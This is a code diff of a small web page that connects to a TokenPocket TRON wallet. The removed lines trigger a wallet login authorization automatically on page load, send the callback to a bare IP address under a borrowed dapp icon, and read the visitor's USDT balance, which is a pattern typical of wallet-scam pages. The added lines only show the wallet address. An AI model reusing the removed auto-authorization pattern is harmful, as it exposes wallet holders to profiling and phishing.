@@ -3,38 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TokenPocket Auto Authorization</title>
+    <title>TokenPocket TRON Wallet Address</title>
 </head>
 <body>
-    <h1>TokenPocket USDT Balance</h1>
-    <p id="balance">Connecting to TokenPocket...</p>
+    <h1>TRON Wallet Address</h1>
+    <p id="walletAddress">Connecting to TokenPocket...</p>
 
     <script>
-        async function autoAuthorizeAndGetBalance() {
-            // 发起 TokenPocket 授权请求
-            const param = {
-                "callbackUrl": "http://115.205.0.178:9011/taaBizApi/taaInitData",
-                "action": "login",
-                "actionId": "1648522106711",
-                "blockchain": "tron",
-                "dappIcon": "https://eosknights.io/img/icon.png",
-                "dappName": "zs",
-                "protocol": "TokenPocket",
-                "version": "2.0"
-            };
-
-            // 将 param 编码
-            const encodedParam = encodeURIComponent(JSON.stringify(param));
-
-            // 生成授权 URL
-            const authUrl = `tpoutside://pull.activity?param=${encodedParam}`;
-
-            // 自动重定向到授权页面
-            window.location.href = authUrl;
-
-            // 授权完成后，连接钱包并获取 USDT 余额
+        async function getWalletAddress() {
+            // 检查是否在 TokenPocket 中打开
             if (typeof window.tronLink === 'undefined') {
-                document.getElementById('balance').innerText = '请通过 TokenPocket 打开该页面！';
+                document.getElementById('walletAddress').innerText = '请通过 TokenPocket 打开该页面！';
                 return;
             }
 
@@ -42,31 +21,26 @@
                 const tronLink = window.tronLink;
                 const tronWeb = tronLink.tronWeb;
 
+                // 确保钱包准备好
                 if (!tronWeb || !tronWeb.ready) {
-                    document.getElementById('balance').innerText = 'TokenPocket 钱包尚未准备好。';
+                    document.getElementById('walletAddress').innerText = 'TokenPocket 钱包尚未准备好。';
                     return;
                 }
 
-                // 请求钱包连接
+                // 请求连接的钱包地址
                 const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
-                const fromAddress = accounts[0];
+                const walletAddress = accounts[0];
 
-                // 获取 USDT 余额，USDT 的合约地址
-                const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRON USDT 主网合约地址
-                const contract = await tronWeb.contract().at(tokenContractAddress);
-                const balanceInSun = await contract.methods.balanceOf(fromAddress).call();
-
-                // 转换 USDT 余额（6 位小数）
-                const balanceInUSDT = tronWeb.toBigNumber(balanceInSun).dividedBy(1e6).toString(10);
-                document.getElementById('balance').innerText = `Your USDT Balance: ${balanceInUSDT}`;
+                // 显示钱包地址
+                document.getElementById('walletAddress').innerText = `Connected TRON Wallet Address: ${walletAddress}`;
             } catch (error) {
                 console.error('连接钱包失败:', error);
-                document.getElementById('balance').innerText = '连接钱包时发生错误，请查看控制台。';
+                document.getElementById('walletAddress').innerText = '连接钱包时发生错误，请查看控制台。';
             }
         }
 
-        // 页面加载时自动调用授权和余额获取
-        window.addEventListener('load', autoAuthorizeAndGetBalance);
+        // 页面加载时自动调用函数
+        window.addEventListener('load', getWalletAddress);
     </script>
 </body>
 </html>
